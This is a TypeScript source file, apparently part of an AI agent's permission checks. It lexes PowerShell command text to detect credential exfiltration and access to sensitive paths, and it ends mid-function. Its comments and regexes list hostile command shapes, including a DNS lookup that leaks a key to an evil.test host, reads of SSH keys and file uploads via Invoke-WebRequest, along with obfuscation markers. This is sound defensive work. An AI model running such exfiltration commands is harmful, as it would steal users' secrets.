/**
 * The shell floors for the `powershell` host shell: credential exfiltration
 * and sensitive path (issue #28; bash: `shell-exfiltration.ts`).
 *
 * The permission decision is synchronous and the host's PowerShell AST
 * (`tools/powershell-ast.ts`) needs a `pwsh` child process, so these floors
 * read the command text with a small PowerShell-aware lexer. Each signal is
 * the UNION of two readings:
 *
 *  - the bash floor over the same text (`curl.exe -T f`, `cat ~/.ssh/id_rsa`
 *    and other native-program shapes read the same in both shells);
 *  - a PowerShell pass that knows cmdlets, aliases, parameter-name prefixes,
 *    `(…)` / `$(…)` / `{…}` / `@{…}` groups, `$var = …` assignments and the
 *    pipeline, and normalizes `$env:USERPROFILE`, `$HOME`, `~\` and `\`
 *    separators for the sensitive-path scan.
 *
 * Exfiltration (one command sends data off the machine and the data comes
 * from a file or secret):
 *
 *  - `Invoke-WebRequest` / `Invoke-RestMethod` (`iwr`, `irm`, and `curl` /
 *    `wget`, which are their aliases in Windows PowerShell 5.1) with
 *    `-InFile`, with any argument (URI included) built from a file read —
 *    `-Body (Get-Content f)`, `-Body $k` after `$k = gc f`, a `-Form` holding
 *    `Get-Item f` — or fed by an earlier pipeline stage, whose output binds
 *    to `-Body` (bash: `… | curl -d @-`);
 *  - `Start-BitsTransfer -TransferType Upload`, `Send-MailMessage
 *    -Attachments` (or a piped attachment), `Copy-Item -ToSession`;
 *  - `.NET` uploads: `WebClient.UploadFile` (any file) and `UploadString` /
 *    `UploadData` / `UploadValues` / `HttpClient.PostAsync` / … whose
 *    arguments carry file data;
 *  - any other network cmdlet or native network program whose arguments carry
 *    file data (`Resolve-DnsName "$(gc key).evil.test"`);
 *  - reader-independent: a sensitive path anywhere in the command together
 *    with any network-capable command or code the lexer cannot read.
 *
 * File data comes from `Get-Content` / `gc` / `cat` / `type` /
 * `Select-String` / `Import-Clixml` / `Get-Item` / `[IO.File]::Read*` /
 * secret stores (`Get-Secret`, `Get-StoredCredential`, `cmdkey`) / `env:`
 * drive enumeration, from a variable assigned from one (to a fixed point),
 * and from `$_` inside a pipeline stage fed by one.
 *
 * Literal and encoded scripts in child shells, expression invocations and
 * script creation are recursively checked by the same floors. Opaque scripts,
 * mutated network splats and unresolved computed upload paths require per-call approval.
 * Sensitive path expressions and profile-anchored short names use the canonical
 * path table; incomplete computed prefixes retain every row they could reach.
 *
 * Plain `Invoke-WebRequest` GETs (also `-OutFile`), `$env:TOKEN` in a header
 * (bash parity: `curl -H "A: $TOKEN"` is not floored) and local file
 * cmdlets are not exfiltration. Input the lexer cannot read (unbalanced
 * quotes or groups) is hidden code and requires per-call approval; a regex
 * fallback preserves the specific file-upload reason when visible.
 *
 * There is no `PowerShell(...)` rule language: these floors are the only
 * command-text policy for PowerShell; `Bash(...)` rules never match it.
 */
import { homedir } from "node:os";
import { join, posix } from "node:path";
import { SENSITIVE_PATH_ENTRIES } from "../sensitive-paths.js";
import {
  asParsedShellCommand,
  isNetworkProgram,
  type ParsedShellCommand,
  type ShellCommandInput,
} from "./shell-prefix-policy.js";
import {
  MULTI_PURPOSE_NETWORK,
  sensitivePathInArgumentText,
  sensitivePathInCodeText,
  shellExfiltrationSignal,
  shellSensitivePathSignal,
} from "./shell-exfiltration.js";

// ─── Lexer ───────────────────────────────────────────────────────────────

interface PsWord {
  kind: "word";
  /** Source text of the token. */
  raw: string;
  /** Dequoted text (quotes and backtick escapes removed). */
  text: string;
  quoted: boolean;
  /** `$(…)` bodies inside the word or an expandable string. */
  nested: PsPipeline[][];
}

interface PsGroup {
  kind: "group";
  raw: string;
  open: "(" | "$(" | "@(" | "{" | "@{";
  body: PsPipeline[];
}

type PsToken = PsWord | PsGroup;

interface PsCommand {
  tokens: PsToken[];
}

interface PsPipeline {
  stages: PsCommand[];
  /** Lower-cased variable names this pipeline's output is assigned to. */
  assign: string[];
  compound: boolean;
  /** Original assignment targets and member accesses, before stripping assignments. */
  references: string;
  /** Hashtable entry key (`@{ InFile = 'x' }`), when this is one. */
  key?: string;
}

class PsUnreadable extends Error {}

const GROUP_CLOSER: Record<PsGroup["open"], ")" | "}"> = { "(": ")", "$(": ")", "@(": ")", "{": "}", "@{": "}" };
const WORD_END = /[\s;|&(){},'"]/;
const MAX_DEPTH = 32;

/** The tokenizer's complete IsDash set, including parameter and operator spellings. */
function normalizeDashes(text: string): string {
  return text.replace(/[\u2013-\u2015]/g, "-");
}

class Lexer {
  private index = 0;
  private depth = 0;
  constructor(private readonly source: string) {}

  parseProgram(): PsPipeline[] {
    const body = this.parseBody(undefined);
    if (this.index < this.source.length) throw new PsUnreadable("unbalanced group");
    return body;
  }

  /** Statements up to `closer` (consumed) or the end of input. */
  private parseBody(closer: ")" | "}" | undefined): PsPipeline[] {
    if (++this.depth > MAX_DEPTH) throw new PsUnreadable("nesting too deep");
    const pipelines: PsPipeline[] = [];
    let stages: PsCommand[] = [];
    let tokens: PsToken[] = [];
    const endCommand = (): void => {
      if (tokens.length > 0) stages.push({ tokens });
      tokens = [];
    };
    const endPipeline = (): void => {
      endCommand();
      if (stages.length > 0) pipelines.push(toPipeline(stages));
      stages = [];
    };
    const src = this.source;
    while (this.index < src.length) {
      const char = src[this.index]!;
      const next = src[this.index + 1];
      if (char === " " || char === "\t" || char === "," ) { this.index += 1; continue; }
      if (char === "`" && (next === "\n" || next === "\r")) { this.index += 2; continue; }
      if (char === "\n" || char === "\r" || char === ";") { endPipeline(); this.index += 1; continue; }
      if (char === "<" && next === "#") {
        const end = src.indexOf("#>", this.index + 2);
        if (end === -1) throw new PsUnreadable("unterminated comment");
        this.index = end + 2;
        continue;
      }
      if (char === "#") {
        while (this.index < src.length && src[this.index] !== "\n") this.index += 1;
        continue;
      }
      if (char === "|" ) {
        if (next === "|") { endPipeline(); this.index += 2; continue; }
        endCommand();
        this.index += 1;
        continue;
      }
      if (char === "&") {
        if (next === "&") { endPipeline(); this.index += 2; continue; }
        tokens.push(word("&", "&", false, []));
        this.index += 1;
        continue;
      }
      if (char === ")" || char === "}") {
        if (char !== closer) throw new PsUnreadable("unbalanced group");
        this.index += 1;
        endPipeline();
        this.depth -= 1;
        return pipelines;
      }
      const open = groupOpenAt(src, this.index);
      if (open) {
        tokens.push(this.parseGroup(open));
        continue;
      }
      if ((char === "@") && (next === "'" || next === "\"") && /^[ \t]*\r?\n/.test(src.slice(this.index + 2))) {
        tokens.push(this.parseHereString(next));
        continue;
      }
      if (char === "'") { tokens.push(this.parseSingleQuoted()); continue; }
      if (char === "\"") { tokens.push(this.parseDoubleQuoted()); continue; }
      tokens.push(this.parseBareword());
    }
    if (closer !== undefined) throw new PsUnreadable("unterminated group");
    endPipeline();
    this.depth -= 1;
    return pipelines;
  }

  private parseGroup(open: PsGroup["open"]): PsGroup {
    const start = this.index;
    this.index += open.length;
    const body = this.parseBody(GROUP_CLOSER[open]);
    return { kind: "group", raw: this.source.slice(start, this.index), open, body };
  }

  private parseSingleQuoted(): PsWord {
    const start = this.index;
    let text = "";
    this.index += 1;
    for (;;) {
      if (this.index >= this.source.length) throw new PsUnreadable("unterminated string");
      const char = this.source[this.index]!;
      if (char === "'") {
        if (this.source[this.index + 1] === "'") { text += "'"; this.index += 2; continue; }
        this.index += 1;
        break;
      }
      text += char;
      this.index += 1;
    }
    return word(this.source.slice(start, this.index), text, true, []);
  }

  private parseDoubleQuoted(): PsWord {
    const start = this.index;
    let text = "";
    const nested: PsPipeline[][] = [];
    this.index += 1;
    for (;;) {
      if (this.index >= this.source.length) throw new PsUnreadable("unterminated string");
      const char = this.source[this.index]!;
      if (char === "`") { text += this.source[this.index + 1] ?? ""; this.index += 2; continue; }
      if (char === "\"") {
        if (this.source[this.index + 1] === "\"") { text += "\""; this.index += 2; continue; }
        this.index += 1;
        break;
      }
      if (char === "$" && this.source[this.index + 1] === "(") {
        const group = this.parseGroup("$(");
        nested.push(group.body);
        text += group.raw;
        continue;
      }
      text += char;
      this.index += 1;
    }
    return word(this.source.slice(start, this.index), text, true, nested);
  }

  private parseHereString(quote: "'" | "\""): PsWord {
    const start = this.index;
    const terminator = new RegExp(`\\r?\\n${quote}@`, "g");
    terminator.lastIndex = this.index + 2;
    const end = terminator.exec(this.source);
    if (!end) throw new PsUnreadable("unterminated here-string");
    const text = this.source.slice(this.index + 2, end.index);
    this.index = end.index + end[0].length;
    const nested: PsPipeline[][] = [];
    if (quote === "\"") {
      for (const body of subexpressionBodies(text)) nested.push(new Lexer(body).parseProgram());
    }
    return word(this.source.slice(start, this.index), text, true, nested);
  }

  private parseBareword(): PsWord {
    const start = this.index;
    let text = "";
    const nested: PsPipeline[][] = [];
    const src = this.source;
    // `--%` stops parsing: the rest of the line is passed verbatim.
    if (normalizeDashes(src.slice(this.index, this.index + 3)) === "--%") {
      let end = this.index;
      while (end < src.length && src[end] !== "\n") end += 1;
      const raw = src.slice(this.index, end);
      this.index = end;
      return word(raw, raw, false, []);
    }
    while (this.index < src.length) {
      const char = src[this.index]!;
      if (char === "`") { text += src[this.index + 1] ?? ""; this.index += 2; continue; }
      if (char === "$" && src[this.index + 1] === "(") {
        const group = this.parseGroup("$(");
        nested.push(group.body);
        text += group.raw;
        continue;
      }
      // `${env:HOME}` is one variable token.
      if (char === "$" && src[this.index + 1] === "{") {
        const close = src.indexOf("}", this.index + 2);
        if (close === -1) throw new PsUnreadable("unterminated variable");
        text += src.slice(this.index, close + 1);
        this.index = close + 1;
        continue;
      }
      if (WORD_END.test(char)) break;
      text += char;
      this.index += 1;
    }
    if (this.index === start) {
      // A lone operator character no branch above consumes.
      this.index += 1;
      return word(src[start]!, src[start]!, false, []);
    }
    return word(src.slice(start, this.index), normalizeDashes(text), false, nested);
  }
}

function word(raw: string, text: string, quoted: boolean, nested: PsPipeline[][]): PsWord {
  return { kind: "word", raw, text, quoted, nested };
}

function groupOpenAt(src: string, index: number): PsGroup["open"] | undefined {
  const char = src[index];
  const next = src[index + 1];
  if (char === "(" || char === "{") return char;
  if ((char === "$" || char === "@") && next === "(") return `${char}(` as "$(" | "@(";
  if (char === "@" && next === "{") return "@{";
  return undefined;
}

/** `$(…)` bodies of expandable text (here-strings). */
function subexpressionBodies(text: string): string[] {
  const bodies: string[] = [];
  for (let index = text.indexOf("$("); index !== -1; index = text.indexOf("$(", index + 2)) {
    let depth = 0;
    for (let end = index + 1; end < text.length; end += 1) {
      if (text[end] === "(") depth += 1;
      else if (text[end] === ")" && --depth === 0) { bodies.push(text.slice(index + 2, end)); break; }
    }
    if (depth !== 0) throw new PsUnreadable("unterminated subexpression");
  }
  return bodies;
}

const VARIABLE = /^(?:\[[^\]]*\])*\$(?:\{([^}]+)\}|([\w:?]+))$/;

/** `$k = …`, `[string]$k = …`, `$k=…`, `$a = $b = …`. */
function toPipeline(stages: PsCommand[]): PsPipeline {
  const assign: string[] = [];
  let compound = false;
  let key: string | undefined;
  const first = stages[0]!;
  const references = first.tokens.filter((token) => token.kind === "word" && !token.raw.startsWith("'"))
    .map((token) => token.raw).join(" ");
  let tokens = first.tokens;
  for (;;) {
    const head = tokens[0];
    if (head?.kind !== "word") break;
    const inline = head.quoted ? null : /^((?:\[[^\]]*\])*\$(?:\{[^}]+\}|[\w:]+))([+\-*/]?=)(.*)$/s.exec(head.text);
    if (inline) {
      const name = VARIABLE.exec(inline[1]!);
      if (!name) break;
      assign.push((name[1] ?? name[2]!).toLowerCase());
      compound ||= inline[2] !== "=";
      tokens = inline[3] ? [word(inline[3], inline[3], false, head.nested), ...tokens.slice(1)] : tokens.slice(1);
      continue;
    }
    const second = tokens[1];
    const name = VARIABLE.exec(head.text);
    if (second?.kind === "word" && !second.quoted && /^[+\-*/]?=$/.test(second.text) && !head.text.startsWith("-")) {
      // `$k = …` assigns; `key = …` is a hashtable entry (`@{ f = Get-Item x }`).
      if (name && !head.quoted) assign.push((name[1] ?? name[2]!).toLowerCase());
      else key ??= head.text;
      compound ||= second.text !== "=";
      tokens = tokens.slice(2);
      continue;
    }
    const entry = head.quoted ? null : /^([A-Za-z_][\w-]*)=(.*)$/s.exec(head.text);
    if (entry) {
      key ??= entry[1];
      tokens = entry[2] ? [word(entry[2], entry[2], false, head.nested), ...tokens.slice(1)] : tokens.slice(1);
      continue;
    }
    break;
  }
  const rest = tokens.length > 0 ? [{ tokens }, ...stages.slice(1)] : stages.slice(1);
  return { stages: rest, assign, compound, references, ...(key === undefined ? {} : { key }) };
}

// ─── Command facts ───────────────────────────────────────────────────────

const HTTP_CMDLETS = new Set(["invoke-webrequest", "iwr", "invoke-restmethod", "irm", "curl", "wget"]);
/** Names that are also native programs (`curl.exe`, PowerShell 7's `curl`). */
const NATIVE_ALIASED = new Set(["curl", "wget"]);
const OTHER_NETWORK_CMDLETS = new Set([
  "start-bitstransfer", "send-mailmessage", "resolve-dnsname", "test-netconnection", "tnc", "test-connection",
  "new-pssession", "enter-pssession", "invoke-command", "icm", "new-webserviceproxy", "bitsadmin", "certutil",
  "ftp", "ssh", "scp", "sftp", "nslookup", "ping",
]);
const COPY_CMDLETS = new Set(["copy-item", "copy", "cp", "cpi"]);
const FILE_READERS = new Set([
  "get-content", "gc", "cat", "type", "select-string", "sls", "import-clixml", "import-csv", "format-hex", "fhx",
  "get-item", "gi", "get-secret", "get-storedcredential", "cmdkey", "vaultcmd",
  "base64", "certutil", "xxd", "od", "head", "tail", "tar", "openssl", "gpg",
]);
const ENV_LISTERS = new Set(["get-childitem", "gci", "dir", "ls", "get-item", "gi", "get-content", "gc", "cat", "type"]);
const SET_VARIABLE = new Set(["set-variable", "sv", "new-variable", "nv"]);
const SCRIPT_BLOCK_RUNNERS = new Set(["foreach-object", "%", "where-object", "?", "where", "foreach"]);
/** `.NET` reads of file or secret data, matched against the whole token text. */
const DOTNET_READER = /\[(?:system\.)?io\.file\]::(?:read|open)|\.readallbytes|\.readalltext|\.readtoend|\[(?:system\.)?environment\]::getenvironmentvariables|passwordvault|getnetworkcredential|convertfrom-securestring/i;
/** `.NET` upload methods; `uploadfile` sends a named file whatever its arguments. */
const DOTNET_UPLOAD_FILE = /\.uploadfile(?:async|taskasync)?$/i;
const DOTNET_UPLOAD_DATA = /\.(?:upload(?:string|data|values)(?:async|taskasync)?|(?:post|put|patch|send)async)$/i;
const DOTNET_SEND = /\.(?:send|write|beginsend|sendto)$/i;
const DOTNET_NETWORK = /\b(?:(?:system\.)?net\.(?:webclient|http\.httpclient|webrequest|httpwebrequest|sockets\.\w+|mail\.smtpclient)|webclient|httpclient|tcpclient|udpclient|smtpclient|networkstream|clientwebsocket)\b/i;
/** Code the floor cannot read statically. */
const HIDDEN_CODE = /\b(?:iex|invoke-expression|invoke-command|icm|add-type|start-job|frombase64string)\b|\[scriptblock\]::create|\$executioncontext\.invokecommand|(?:^|\s)-(?:enc|encodedcommand|e|ec)\s|&\s*[$(]|(?:^|[\s;])\.\s+\$|\.invoke\s*\(/i;
const UNREADABLE_FALLBACK = /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget)\b[^\n]*\s-inf|\b(?:start-bitstransfer)\b[^\n]*-t\w*[\s:]+["']?upload|\bsend-mailmessage\b[^\n]*-at|\.uploadfile/i;

function canonicalName(text: string): string {
  return (text.split(/[\\/]/).pop() ?? text).toLowerCase();
}

/** Command name: the first token, or the one after a `&` / `.` call operator. */
function headOf(cmd: PsCommand, ctx?: Context): { name: string | undefined; args: PsToken[] } {
  let index = 0;
  const first = cmd.tokens[0];
  if (first?.kind === "word" && !first.quoted && (first.text === "&" || first.text === ".")) index = 1;
  const head = cmd.tokens[index];
  if (index === 1 && head && ctx) {
    const value = evaluateValue([head], ctx);
    if (value && !value.text.includes(DYNAMIC)) return { name: canonicalName(value.text), args: cmd.tokens.slice(index + 1) };
  }
  if (head?.kind !== "word") return { name: undefined, args: cmd.tokens.slice(index) };
  return { name: canonicalName(head.text), args: cmd.tokens.slice(index + 1) };
}

/**
 * `-Name` / `-Name:` matches a parameter when it is a non-empty prefix of
 * its full name (PowerShell resolves unambiguous prefixes; an ambiguous
 * one is an error and runs nothing, so a prefix is enough here).
 */
function parameterIs(token: PsToken | undefined, parameter: string): boolean {
  if (token?.kind !== "word" || token.quoted) return false;
  const match = /^-([A-Za-z][\w-]*):?/.exec(normalizeDashes(token.text));
  return match !== null && parameter.startsWith(match[1]!.toLowerCase());
}

function parameterIndex(args: readonly PsToken[], parameter: string): number {
  return args.findIndex((token) => parameterIs(token, parameter));
}

/** The value of `-Name value` or `-Name:value`, as text. */
function parameterValue(args: readonly PsToken[], parameter: string): string | undefined {
  const index = parameterIndex(args, parameter);
  if (index === -1) return undefined;
  const token = args[index] as PsWord;
  const inline = token.text.indexOf(":");
  if (inline !== -1 && inline < token.text.length - 1) return token.text.slice(inline + 1);
  const value = args[index + 1];
  if (value === undefined) return undefined;
  if (value.kind === "word") return value.text;
  // `(…)` / a splatted entry holding one literal: its text.
  const only = value.body.length === 1 && value.body[0]!.stages.length === 1 ? value.body[0]!.stages[0]!.tokens : [];
  return only.length === 1 && only[0]!.kind === "word" ? only[0]!.text : value.raw;
}

interface Context {
  cwd: string | undefined;
  /** Lower-cased variables holding file or secret data. */
  tainted: Set<string>;
  /** Lower-cased variables assigned a hashtable literal, as `-Key (value)` arguments. */
  splats: Map<string, PsToken[]>;
  values: Map<string, PsValue>;
}

interface PsValue {
  text: string;
  computed: boolean;
}

/** Only literal data and the explicitly modeled string/path operations are evaluated. */
function evaluateValue(tokens: readonly PsToken[], ctx: Context): PsValue | undefined {
  if (tokens.length === 0) return undefined;
  const first = tokens[0]!;
  if (tokens.length === 1) {
    if (first.kind === "group") {
      if (first.open === "@{" || first.body.length !== 1) return undefined;
      const pipeline = first.body[0]!;
      if (pipeline.assign.length || pipeline.stages.length !== 1) return undefined;
      const inner = pipeline.stages[0]!.tokens;
      if (inner.length === 1 && inner[0]?.kind === "word" && !inner[0].quoted && !inner[0].text.startsWith("$")) return undefined;
      return evaluateValue(inner, ctx);
    }
    if (first.nested.length) return undefined;
    if (first.raw.startsWith("'") || first.raw.startsWith("@'")) return { text: first.text, computed: false };
    let computed = false;
    const text = first.text.replace(/\$(?:\{([^}]+)\}|([\w:]+))/g, (_match, braced: string | undefined, plain: string | undefined) => {
      const name = (braced ?? plain!).toLowerCase();
      if (name.startsWith("env:")) return envValue(name.slice(4));
      if (name === "home") return homedir();
      const known = ctx.values.get(name);
      computed ||= known?.computed ?? false;
      return known?.text ?? DYNAMIC;
    });
    return { text, computed };
  }
  // A bare variable and its following '+' may share a lexer word.
  const parts = tokens.flatMap((token): PsToken[] => token.kind === "word" && !token.quoted && token.text.includes("+")
    ? token.text.split(/(\+)/).filter(Boolean).map((text) => word(text, text, false, [])) : [token]);
  const plus = parts.findIndex((token) => token.kind === "word" && !token.quoted && token.text === "+");
  if (plus !== -1) {
    const left = evaluateValue(parts.slice(0, plus), ctx);
    const right = evaluateValue(parts.slice(plus + 1), ctx);
    return { text: (left?.text ?? DYNAMIC) + (right?.text ?? DYNAMIC), computed: true };
  }
  const format = tokens.findIndex((token) => token.kind === "word" && !token.quoted && normalizeDashes(token.text).toLowerCase() === "-f");
  if (format !== -1) {
    const template = evaluateValue(tokens.slice(0, format), ctx);
    const values = tokens.slice(format + 1).map((token) => evaluateValue([token], ctx)?.text ?? DYNAMIC);
    return { text: template?.text.replace(/\{\{|\}\}|\{(\d+)\}|[{}]/g, (match, index: string | undefined) => index !== undefined
      ? values[Number(index)] ?? DYNAMIC : match === "{{" ? "{" : match === "}}" ? "}" : DYNAMIC) ?? DYNAMIC, computed: true };
  }
  if (first.kind === "word" && !first.quoted && canonicalName(first.text) === "join-path") {
    const positional: string[] = [];
    const named = new Map<string, string>();
    for (let index = 1; index < tokens.length; index += 1) {
      const token = tokens[index]!;
      if (token.kind === "word" && !token.quoted && token.text.startsWith("-")) {
        const parameter = ["path", "childpath", "additionalchildpath"].find((name) => parameterIs(token, name));
        if (!parameter) return { text: DYNAMIC, computed: true };
        const inline = token.text.indexOf(":");
        if (inline !== -1 && inline < token.text.length - 1) {
          named.set(parameter, evaluateValue([word(token.text.slice(inline + 1), token.text.slice(inline + 1), false, [])], ctx)?.text ?? DYNAMIC);
          continue;
        }
        index += 1;
        named.set(parameter, evaluateValue(tokens[index] ? [tokens[index]!] : [], ctx)?.text ?? DYNAMIC);
      } else {
        positional.push(evaluateValue([token], ctx)?.text ?? DYNAMIC);
      }
    }
    const values = [named.get("path") ?? positional.shift() ?? DYNAMIC, named.get("childpath") ?? positional.shift() ?? DYNAMIC,
      ...(named.has("additionalchildpath") ? [named.get("additionalchildpath")!] : []), ...positional];
    return { text: values.length >= 2 ? values.map((value, index) => index === 0 ? value.replace(/[\\/]+$/, "") : value.replace(/^[\\/]+/, "")).join("/") : DYNAMIC, computed: true };
  }
  return undefined;
}

function collectValues(pipelines: readonly PsPipeline[], ctx: Context): void {
  const assigned = new Set<string>();
  for (const pipeline of allPipelines(pipelines)) {
    if (pipeline.assign.length === 0) continue;
    const value = pipeline.stages.length === 1 ? evaluateValue(pipeline.stages[0]!.tokens, ctx) : undefined;
    for (const name of pipeline.assign) {
      ctx.values.set(name, !pipeline.compound && !assigned.has(name) && value !== undefined ? value : { text: DYNAMIC, computed: true });
      assigned.add(name);
    }
  }
}

function allPipelines(pipelines: readonly PsPipeline[]): PsPipeline[] {
  const out: PsPipeline[] = [];
  const visit = (list: readonly PsPipeline[]): void => {
    for (const pipeline of list) {
      out.push(pipeline);
      for (const stage of pipeline.stages) for (const token of stage.tokens) visitToken(token);
    }
  };
  const visitToken = (token: PsToken): void => {
    if (token.kind === "group") visit(token.body);
    else for (const body of token.nested) visit(body);
  };
  visit(pipelines);
  return out;
}

function referencesTainted(text: string, ctx: Context): boolean {
  if (ctx.tainted.size === 0) return false;
  for (const match of text.matchAll(/\$(?:\{([^}]+)\}|([\w:]+))/g)) {
    const name = (match[1] ?? match[2]!).toLowerCase();
    if (ctx.tainted.has(name) || ctx.tainted.has(name.replace(/^(?:script|global|local|private|using):/, ""))) return true;
  }
  return false;
}

/** The command itself reads a file or secret. */
function isReader(cmd: PsCommand, ctx: Context): boolean {
  const { name, args } = headOf(cmd, ctx);
  if (name !== undefined) {
    const bare = name.replace(/\.exe$/, "");
    if (FILE_READERS.has(name) || FILE_READERS.has(bare)) return true;
    if (ENV_LISTERS.has(name) && args.some((token) => token.kind === "word" && /^env:/i.test(token.text))) return true;
  }
  return cmd.tokens.some((token) => token.kind === "word" && !token.quoted && DOTNET_READER.test(token.text));
}

/** A token's value carries file or secret data. */
function tokenCarriesData(token: PsToken, ctx: Context): boolean {
  if (token.kind === "group") return pipelinesCarryData(token.body, ctx);
  if (!token.quoted || token.raw.startsWith("\"") || token.raw.startsWith("@\"")) {
    if (referencesTainted(token.text, ctx)) return true;
  }
  if (!token.quoted && DOTNET_READER.test(token.text)) return true;
  return token.nested.some((body) => pipelinesCarryData(body, ctx));
}

function commandCarriesData(cmd: PsCommand, ctx: Context): boolean {
  return isReader(cmd, ctx) || cmd.tokens.some((token) => tokenCarriesData(token, ctx));
}

function pipelinesCarryData(pipelines: readonly PsPipeline[], ctx: Context): boolean {
  return pipelines.some((pipeline) => pipeline.stages.some((stage) => commandCarriesData(stage, ctx)));
}

/**
 * Variables assigned from file data anywhere in the command, to a fixed
 * point (`$a = gc f; $b = $a`): assignments, `Set-Variable`, `-OutVariable`
 * on a reader, and `foreach ($l in <reader>)`.
 */
function collectTainted(pipelines: readonly PsPipeline[], ctx: Context): void {
  const every = allPipelines(pipelines);
  for (let changed = true; changed;) {
    changed = false;
    const taint = (name: string | undefined): void => {
      if (name === undefined) return;
      const key = name.replace(/^\$/, "").toLowerCase();
      if (key && !ctx.tainted.has(key)) { ctx.tainted.add(key); changed = true; }
    };
    for (const pipeline of every) {
      const carries = pipeline.stages.some((stage) => commandCarriesData(stage, ctx));
      if (carries) for (const name of pipeline.assign) taint(name);
      for (const stage of pipeline.stages) {
        const { name, args } = headOf(stage, ctx);
        if (name !== undefined && SET_VARIABLE.has(name) && commandCarriesData({ tokens: args }, ctx)) {
          const explicit = parameterValue(args, "name");
          taint(explicit ?? args.find((token): token is PsWord => token.kind === "word" && !token.text.startsWith("-"))?.text);
        }
        if (isReader(stage, ctx) || (carries && stage === pipeline.stages[0])) {
          taint(parameterValue(args, "outvariable") ?? parameterValue(args, "ov"));
        }
        for (const token of stage.tokens) {
          if (token.kind === "group" && token.open === "(" && foreachSourceCarriesData(token, ctx)) {
            taint(/^\(\s*\$(\w+)/.exec(token.raw)?.[1]);
          }
        }
      }
    }
  }
}

/** `foreach ($l in <source>)`: the source after `in` carries file data. */
function foreachSourceCarriesData(group: PsGroup, ctx: Context): boolean {
  if (!/^\(\s*\$\w+\s+in\s/i.test(group.raw)) return false;
  const [first, ...rest] = group.body;
  if (!first) return false;
  const [head, ...stages] = first.stages;
  const inIndex = head?.tokens.findIndex((token) => token.kind === "word" && !token.quoted && token.text.toLowerCase() === "in") ?? -1;
  if (!head || inIndex === -1) return false;
  return commandCarriesData({ tokens: head.tokens.slice(inIndex + 1) }, ctx)
    || stages.some((stage) => commandCarriesData(stage, ctx))
    || pipelinesCarryData(rest, ctx);
}

/** Synthetic bash text for a native program's argv, for the bash sender rules. */
function bashArgv(name: string, args: readonly PsToken[]): string {
  const quote = (text: string): string => `'${normalizePaths(text).replace(/'/g, "'\\''")}'`;
  return [name, ...args.map((token) => quote(token.kind === "word" ? token.text : "__ave_dynamic__"))].join(" ");
}

/**
 * Arguments with `@p` splats replaced by the hashtable `p` was assigned in
 * this command, or `null` when a splat's parameters cannot be seen.
 */
function expandSplats(args: readonly PsToken[], ctx: Context): PsToken[] | null {
  const out: PsToken[] = [];
  for (const token of args) {
    const splat = token.kind === "word" && !token.quoted ? /^@(\w+)$/.exec(token.text) : null;
    if (!splat) { out.push(token); continue; }
    const entries = ctx.splats.get(splat[1]!.toLowerCase());
    if (!entries) return null;
    out.push(...entries);
  }
  return out;
}

function hasOpaqueComputedValue(token: PsToken, ctx: Context): boolean {
  const value = evaluateValue([token], ctx);
  if (value?.computed && value.text.includes(DYNAMIC)) return true;
  return token.kind === "group" && token.body.some((pipeline) => pipeline.stages.some((stage) => {
    const computed = evaluateValue(stage.tokens, ctx);
    return (computed?.computed && computed.text.includes(DYNAMIC)) || stage.tokens.some((inner) => hasOpaqueComputedValue(inner, ctx));
  }));
}

function senderSignal(cmd: PsCommand, fedByPipeline: boolean, ctx: Context): string | null {
  const head = headOf(cmd, ctx);
  const name = head.name;
  const expanded = expandSplats(head.args, ctx);
  if (expanded === null) {
    return name !== undefined && isNetworkCommand(name, head.args)
      ? `${name} parameters splatted from a variable the floor cannot read`
      : null;
  }
  const args = expanded;
  const carries = args.some((token) => tokenCarriesData(token, ctx));
  if (name !== undefined) {
    const bare = name.replace(/\.exe$/, "");
    if (HTTP_CMDLETS.has(name)) {
      if (parameterIndex(args, "infile") !== -1) return `${name} upload of a file (-InFile)`;
      if (carries) return `${name} request built from file data`;
      if (fedByPipeline) return `${name} request body from the pipeline`;
    }
    if (NATIVE_ALIASED.has(bare) || (isNetworkProgram([bare]) && !HTTP_CMDLETS.has(name))) {
      const native = shellExfiltrationSignal(bashArgv(bare, args), ctx.cwd);
      if (native) return native;
    }
    if (name === "start-bitstransfer" && /^upload/i.test(parameterValue(args, "transfertype") ?? "")) {
      return "Start-BitsTransfer upload";
    }
    if (name === "send-mailmessage") {
      if (parameterIndex(args, "attachments") !== -1) return "Send-MailMessage with attachments";
      if (fedByPipeline) return "Send-MailMessage attachment from the pipeline";
    }
    if (COPY_CMDLETS.has(name) && parameterIndex(args, "tosession") !== -1) return "Copy-Item to a remote session";
    if (isNetworkCommand(name, args) && args.some((token, index) => {
      // Output destinations and authentication headers do not supply upload paths.
      if (parameterIs(args[index - 1], "outfile") || parameterIs(args[index - 1], "headers")) return false;
      return hasOpaqueComputedValue(token, ctx);
    })) return `${name} upload value with hidden code`;
    // Multi-purpose programs routinely take local text that is not a request
    // body (`git commit -m (Get-Content msg.txt -Raw)`), as in the bash floor.
    if (carries && !MULTI_PURPOSE_NETWORK.has(bare)
      && (OTHER_NETWORK_CMDLETS.has(name) || OTHER_NETWORK_CMDLETS.has(bare) || isNetworkProgram([bare]))) {
      return `${name} arguments built from file data`;
    }
  }
  // `.NET` calls: `$wc.UploadFile(…)`, `(New-Object Net.WebClient).UploadString(…)`.
  for (let index = 0; index < cmd.tokens.length; index += 1) {
    const token = cmd.tokens[index]!;
    if (token.kind !== "word" || token.quoted || cmd.tokens[index + 1]?.kind !== "group") continue;
    const method = token.text.replace(/\s+$/, "");
    if (DOTNET_UPLOAD_FILE.test(method)) return ".NET upload of a file";
    const later = cmd.tokens.slice(index + 1);
    if (DOTNET_UPLOAD_DATA.test(method) && later.some((arg) => tokenCarriesData(arg, ctx))) return ".NET upload of file data";
    if (DOTNET_UPLOAD_DATA.test(method) && later.some((arg) => hasOpaqueComputedValue(arg, ctx))) return ".NET upload value with hidden code";
  }
  return null;
}

function walk(pipelines: readonly PsPipeline[], ctx: Context, networkText: boolean): string | null {
  for (const pipeline of pipelines) {
    let fedByData = false;
    for (let index = 0; index < pipeline.stages.length; index += 1) {
      const stage = pipeline.stages[index]!;
      const { name } = headOf(stage, ctx);
      // `$_` / `$PSItem` in a script block fed by file data is file data.
      const stageCtx = fedByData && name !== undefined && SCRIPT_BLOCK_RUNNERS.has(name)
        ? { ...ctx, tainted: new Set([...ctx.tainted, "_", "psitem"]) }
        : ctx;
      const signal = senderSignal(stage, index > 0, stageCtx);
      if (signal) return signal;
      if (networkText && hasDotnetSend(stage) && stage.tokens.some((token) => tokenCarriesData(token, stageCtx))) {
        return ".NET network send of file data";
      }
      for (const token of stage.tokens) {
        const bodies = token.kind === "group" ? [token.body] : token.nested;
